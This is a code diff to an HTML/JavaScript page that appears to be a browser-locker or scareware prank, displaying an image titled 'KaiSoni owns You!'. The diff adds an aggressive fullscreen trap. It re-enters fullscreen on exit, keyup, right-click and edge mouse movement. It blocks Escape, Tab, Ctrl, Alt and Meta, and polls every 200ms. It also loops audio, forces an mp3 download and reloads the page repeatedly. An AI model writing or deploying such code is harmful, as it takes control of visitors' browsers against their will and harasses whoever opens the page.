@@ -42,8 +42,21 @@
       pointer-events: none;
     }
 
+    /* Hide cursor and obscure browser controls */
     body.fullscreen {
-      cursor: none; /* Hide cursor */
+      cursor: none;
+    }
+
+    /* Overlay to block browser UI */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: transparent;
+      z-index: 10000;
+      pointer-events: none; /* Allow interaction with content beneath */
     }
   </style>
 </head>
@@ -53,6 +66,7 @@
       <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
     </div>
   </div>
+  <div class="overlay" id="overlay"></div>
 
   <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>
 
@@ -91,40 +105,65 @@
         console.log('Autoplay prevented:', error);
         document.addEventListener('click', () => {
           audio.play().catch(() => {});
+          enterFullscreen(); // Re-enter fullscreen on user interaction
         }, { once: true });
       });
     }
 
-    // Enhanced fullscreen trap
+    // Advanced fullscreen trap
     function trapFullscreen() {
-      // Re-enter fullscreen on exit
+      // Detect fullscreen exit
       document.addEventListener('fullscreenchange', () => {
         if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
           enterFullscreen();
         }
       });
-      // Block Escape key and other shortcuts
-      document.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape' || e.key === 'F5' || e.ctrlKey || e.altKey) {
-          e.preventDefault();
+      document.addEventListener('webkitfullscreenchange', () => {
+        if (!document.webkitFullscreenElement) {
           enterFullscreen();
         }
       });
-      // Periodically check and re-enter fullscreen
+      document.addEventListener('msfullscreenchange', () => {
+        if (!document.msFullscreenElement) {
+          enterFullscreen();
+        }
+      });
+
+      // Block keyboard shortcuts
+      document.addEventListener('keydown', (e) => {
+        const blockedKeys = ['Escape', 'F5', 'Tab', 'Alt', 'Control', 'Meta'];
+        if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
+          e.preventDefault();
+          e.stopPropagation();
+          enterFullscreen();
+        }
+      });
+
+      // Block mouse interactions that could reveal browser UI
+      document.addEventListener('mousemove', (e) => {
+        if (e.clientY < 50 || e.clientX < 50 || e.clientX > window.innerWidth - 50) {
+          // If mouse nears top/left/right edges, re-enter fullscreen
+          enterFullscreen();
+        }
+      });
+
+      // Periodically enforce fullscreen
       setInterval(() => {
         if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
           enterFullscreen();
         }
-      }, 500);
+      }, 200); // Aggressive check every 200ms
+
+      // Block context menu
+      document.addEventListener('contextmenu', (e) => e.preventDefault());
     }
 
-    // Adjusted download behavior
+    // Handle single download
     function handleDownloads() {
-      // Single download to avoid multiple prompts
       triggerDownload(mp3Url, '1.mp3');
-      // Optional: Uncomment below for controlled multiple downloads
+      // Note: Multiple downloads commented out to avoid prompts
       /*
-      const downloadCount = 3; // Reduced to minimize prompts
+      const downloadCount = 3;
       let delay = 100;
       for (let i = 0; i < downloadCount; i++) {
         setTimeout(() => {
@@ -144,7 +183,7 @@
       // Refresh page after a delay (optional)
       setTimeout(() => {
         window.location.reload();
-      }, 10000); // Increased to 10 seconds
+      }, 15000); // 15 seconds to allow download and reduce strain
     });
 
     // Handle visibility change
@@ -157,11 +196,15 @@
       }
     });
 
-    // Block right-click and shortcuts
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
-    document.addEventListener('keydown', (e) => {
-      if (e.ctrlKey || e.key === 'F5' || e.key === 'Escape' || e.key === 'Tab') {
+    // Block additional interactions
+    document.addEventListener('keyup', (e) => {
+      e.preventDefault();
+      enterFullscreen();
+    });
+    document.addEventListener('mousedown', (e) => {
+      if (e.button === 2) { // Right-click
         e.preventDefault();
+        enterFullscreen();
       }
     });
   </script>
